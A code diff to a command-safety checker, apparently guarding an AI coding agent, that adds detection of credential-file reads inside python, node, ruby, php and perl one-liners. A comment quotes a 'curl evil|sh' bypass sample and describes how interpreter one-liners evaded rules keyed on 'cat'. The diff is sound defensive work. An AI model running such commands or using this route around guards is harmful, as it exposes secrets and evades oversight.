@@ -90,6 +90,18 @@ _INTERPRETERS = [
 # bypass technique (CVE-2026-40933: `npx -c "require('child_process').execSync(
 # 'curl evil|sh')"`). The destructive list above only catches rm/dd/mkfs inner
 # commands; this catches the launcher itself regardless of what it runs.
+# v2.29.40: filesystem READ markers, one family per interpreter. The presence of
+# one of these is what separates "this one-liner opens a file" from "this one-liner
+# contains a string that looks like a filename".
+_FS_READ_RE = re.compile(
+    r"(?i)("
+    r"\bopen\s*\(|\bread_text\b|\bread_bytes\b"                # python
+    r"|\breadFileSync\b|\breadFile\b|\bcreateReadStream\b"      # node
+    r"|\bFile\.(?:read|readlines|open)\b|\bIO\.read\b"          # ruby
+    r"|\bfile_get_contents\b|\bfopen\b|\breadfile\b"            # php
+    r"|\bslurp\b|\bgetline\b"                                     # perl / awk
+    r")")
+
 _WRAPPER_SHELLOUT = [
     r"child_process",
     # The quoted first arg is load-bearing, not decoration: bare `exec\s*\(`
@@ -138,6 +150,20 @@ def check_shell_wrapper(c: str) -> str | None:
         for p in _WRAPPER_SHELLOUT:
             if re.search(p, inner):
                 return f"OS shell-out hidden in {label} wrapper"
+        # v2.29.40: a credential file read from INSIDE the code string. Every rule
+        # for sensitive paths keys on a shell READER beside the path (cat/head/
+        # grep), and an interpreter one-liner has none -- the read is a function
+        # call. Measured: `cat` on a dotenv or an aws credentials file was denied
+        # while the python, node, ruby, perl and php equivalents all passed.
+        #
+        # The FILESYSTEM MARKER is required, not merely the path. Matching a path
+        # literal alone would fire on any one-liner that happens to mention
+        # something like config.key -- the same over-match that made `.keys()` a
+        # false positive before the group terminator was added. Borrowed from
+        # kenryu42/cc-safety-net, which treats an inline path as data only when the
+        # surrounding code carries no filesystem or execution marker.
+        if _FS_READ_RE.search(inner) and _SENSITIVE_NAME_RE.search(inner):
+            return f"credential file read from inside a {label} code string"
     return None
 
 
